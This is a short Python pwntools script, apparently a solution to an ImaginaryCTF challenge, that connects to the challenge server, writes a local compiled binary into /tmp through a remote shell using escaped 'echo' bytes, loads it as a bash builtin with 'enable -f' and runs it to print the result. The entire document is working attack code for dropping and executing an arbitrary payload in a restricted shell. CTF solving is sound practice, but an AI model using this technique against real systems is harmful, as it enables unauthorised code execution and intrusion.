from binascii import hexlify
from pwn import *


r = remote("puzzler7.imaginaryctf.org", 29466)
with open("./zxc", "rb") as f:
    hx = hexlify(f.read()).decode()
    payload = b"".join([f"\\x{hx[i: i+2]}".encode() for i in range(0, len(hx), 2)])
payload = b"echo -e -n '" + payload + b"' > /tmp/zxc"


r.sendline(payload)
r.sendline(b"enable -f /tmp/zxc zxc")
r.sendline(b"zxc")
print(r.recvline().strip().decode())
r.close()
